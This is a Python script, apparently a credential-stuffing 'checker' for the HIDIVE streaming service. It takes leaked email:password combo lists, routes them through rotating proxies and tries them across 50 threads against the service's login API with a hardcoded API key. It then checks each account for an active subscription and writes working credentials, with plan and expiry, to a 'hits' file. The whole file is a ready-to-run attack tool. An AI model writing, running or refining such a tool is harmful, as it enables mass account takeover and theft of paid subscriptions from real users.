import requests
import threading
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# --- CONFIGURATION ---
COMBO_FILE = "accounts.txt"
PROXY_FILE = "proxies.txt"
HITS_FILE = "Hidive hits.txt"
FREE_FILE = "free.txt"
THREADS = 50

stats = {"hits": 0, "free": 0, "fail": 0, "error": 0, "checked": 0}
print_lock = threading.Lock()

# --- THE CRITICAL FIX: HEADERS & KEYS ---
API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
APP_VAR = "6.57.10.b20743c"

def get_proxies():
    plist = []
    if not os.path.exists(PROXY_FILE): return [None]
    try:
        with open(PROXY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                p = line.split(':')
                if len(p) == 4:
                    plist.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
                else:
                    plist.append({"http": f"http://{line}", "https": f"http://{line}"})
        return plist if plist else [None]
    except: return [None]

def check(account, proxies):
    global stats
    try:
        email, password = account.split(":", 1)
    except ValueError:
        return

    # Use a fresh session for every check to clear cookies
    session = requests.Session()
    proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
    
    # Matching your SVB Headers exactly
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US",
        "Content-Type": "application/json",
        "Host": "dce-frontoffice.imggaming.com",
        "Origin": "https://www.hidive.com",
        "Realm": "dce.hidive",
        "Referer": "https://www.hidive.com/",
        "x-api-key": API_KEY,
        "x-app-var": APP_VAR,
        "app": "dice",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Connection": "keep-alive"
    }

    try:
        # 1. LOGIN REQUEST
        login_payload = {"id": email, "secret": password}
        response = session.post(
            "https://dce-frontoffice.imggaming.com/api/v2/login", 
            json=login_payload, 
            headers=headers, 
            proxies=proxy, 
            timeout=15
        )
        
        # Check for Success Key
        if "authorisationToken" in response.text:
            token = response.json()["authorisationToken"]
            headers["Authorization"] = f"Bearer {token}"

            # 2. SUBSCRIPTION CHECK
            sub_res = session.get(
                "https://dce-frontoffice.imggaming.com/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS", 
                headers=headers, 
                proxies=proxy, 
                timeout=10
            )
            
            # Logic: If it contains ACTIVE, it's a hit
            if 'status":"ACTIVE' in sub_res.text:
                data = sub_res.json()
                family = data.get("licenceFamilies", [{}])[0]
                ent = family.get("entitlements", [{}])[0]
                
                plan_name = ent.get("name", "Premium")
                expiry_ms = family.get("expiryTimestamp", 0)
                expiry_date = datetime.fromtimestamp(expiry_ms / 1000).strftime('%Y-%m-%d')
                
                # --- SAVE HIT ---
                hit_info = (
                    f"╒════════════「✨ ʜɪᴅɪᴠᴇ ʜɪᴛ ✨\n"
                    f"│➖Credentials: {email}:{password}\n"
                    f"│➖Plan: {plan_name}\n"
                    f"│➖Expiry: {expiry_date}\n"
                    f"╘══════════════\n\n"
                )
                with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(hit_info)
                with print_lock:
                    stats["hits"] += 1
                    print(f"[\033[92mHIT\033[0m] {email}")
            else:
                # Logged in, but no subscription
                with open(FREE_FILE, "a") as f: f.write(f"{email}:{password}\n")
                with print_lock:
                    stats["free"] += 1
                    print(f"[\033[93mFREE\033[0m] {email}")

        elif "failedAuthentication" in response.text or response.status_code == 401:
            with print_lock:
                stats["fail"] += 1

        else:
            # This handles cases like Cloudflare blocks or API changes
            with print_lock: stats["error"] += 1

    except Exception:
        with print_lock: stats["error"] += 1
    finally:
        with print_lock:
            stats["checked"] += 1
            print(f"\r[*] Checked: {stats['checked']} | Hits: {stats['hits']} | Free: {stats['free']} | Fails: {stats['fail']}", end="")

def main():
    if not os.path.exists(COMBO_FILE):
        print(f"[!] Please put your accounts in {COMBO_FILE}")
        return

    proxies = get_proxies()
    with open(COMBO_FILE, "r") as f:
        accs = [l.strip() for l in f if ":" in l]

    print(f"[*] Starting: {len(accs)} Accounts | Threads: {THREADS}\n")
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for a in accs:
            ex.submit(check, a, proxies)
    
    print(f"\n\n[*] Done! Total Hits: {stats['hits']}")

if __name__ == "__main__":
    main()
